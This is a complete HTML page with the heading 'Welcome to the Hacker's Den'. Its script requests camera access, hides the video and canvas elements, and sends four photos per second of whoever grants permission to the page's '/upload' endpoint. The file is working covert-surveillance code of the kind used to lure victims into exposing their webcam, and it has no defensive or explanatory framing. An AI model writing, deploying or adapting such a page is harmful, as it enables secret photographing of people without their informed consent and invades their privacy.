<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        h1 {
            margin-bottom: 20px;
        }
        .hacker-text {
            color: green;
            font-size: 24px;
            font-family: monospace;
            animation: flicker 1.5s infinite alternate;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <h1>Welcome to the Hacker's Den</h1>
    <div class="hacker-text">Capturing your photos in the background...</div>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Ask for camera access and capture photos automatically
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    setInterval(() => {
                        for (let i = 0; i < 4; i++) {
                            setTimeout(() => {
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const dataURL = canvas.toDataURL('image/png');

                                // Send the captured photo to the server
                                fetch('/upload', {
                                    method: 'POST',
                                    body: JSON.stringify({ image: dataURL }),
                                    headers: {
                                        'Content-Type': 'application/json'
                                    }
                                })
                                .then(response => response.json())
                                .then(data => {
                                    console.log('Image uploaded successfully:', data);
                                })
                                .catch(error => {
                                    console.error('Error uploading image:', error);
                                });
                            }, i * 250); // Capture photos at intervals within each second
                        }
                    }, 1000); // Capture 4 photos every second
                };
            })
            .catch(error => {
                console.error('Error accessing camera:', error);
            });
    </script>
</body>
</html>
